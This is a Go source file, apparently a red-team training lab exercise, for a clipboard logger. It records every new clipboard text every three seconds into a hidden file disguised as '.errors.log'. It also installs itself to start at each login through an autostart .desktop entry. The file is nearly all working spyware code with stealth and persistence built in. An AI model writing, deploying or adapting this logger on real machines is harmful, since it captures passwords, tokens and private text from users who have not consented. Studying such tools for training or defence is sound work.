/*
   Author: Justin Shultz
   ID: m8rZr5w8rON0ii9RiwOdQyzmNtB3
   Lab: Write a program that captures clipboard data

   Description: This Go program is a clipboard logger that tracks changes in clipboard text data
   and logs any new content to a hidden file within the user's home directory. It includes a
   persistence mechanism that ensures the logger starts automatically whenever the user logs
   into their desktop environment. This is achieved by creating a .desktop file in the
   autostart directory. The logger continuously monitors the clipboard every 3 seconds,
   and when new content is detected, it appends the data to the log file.
*/

package main

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"golang.design/x/clipboard"
)

// Common error check.
func checkErr(err error) {
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}

// Function to write clipboard data to the logfile.
func writeClipData(file *os.File, clippedData []byte) {
	_, err := file.WriteString(string(clippedData) + "\n")
	checkErr(err)
}

// Function to compare clipboard data.
func equalClipData(a, b []byte) bool {
	return string(a) == string(b)
}

// Function to add persistence by creating a .desktop file
func addPersistence(homeDir string) {
	// Define the path for the .desktop file
	desktopFilePath := filepath.Join(homeDir, ".config", "autostart", "logger.desktop")

	// Create the .config/autostart directory if it doesn't exist
	err := os.MkdirAll(filepath.Dir(desktopFilePath), 0755)
	checkErr(err)

	// Define the contents of the .desktop file
	desktopFileContents := `[Desktop Entry]
Name=Clipboard Logger
Exec=bash /home/r365/Desktop/RedTeamTraining/ClipboardCapture/runlog.sh
Type=Application
Terminal=false
`

	// Write the .desktop file
	err = os.WriteFile(desktopFilePath, []byte(desktopFileContents), 0664)
	checkErr(err)
}

func main() {
	// Get the user's home directory
	homeDir, err := os.UserHomeDir()
	checkErr(err)

	// Add persistence.
	addPersistence(homeDir)

	// Define the path for the log file in the user's home directory
	logFile := filepath.Join(homeDir, ".errors.log")

	// Initialize the clipboard package.
	err = clipboard.Init()
	checkErr(err)

	// Read the initial clipboard buffer.
	clipData := clipboard.Read(clipboard.FmtText)
	checkErr(err)

	// Open the log file in Append mode, create it if it doesn't exist.
	file, err := os.OpenFile(logFile, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	checkErr(err)
	defer file.Close()

	// Write the initial clipboard data.
	writeClipData(file, clipData)

	// Monitor clipboard data changes.
	for {
		// Read the clipboard buffer.
		newClipData := clipboard.Read(clipboard.FmtText)
		checkErr(err)

		// Check if the new clipboard data is different.
		if !equalClipData(clipData, newClipData) {
			// Write the new clipboard data into the log file.
			writeClipData(file, newClipData)

			// Update clipData to the new data.
			clipData = newClipData
		}

		time.Sleep(3 * time.Second)
	}
}
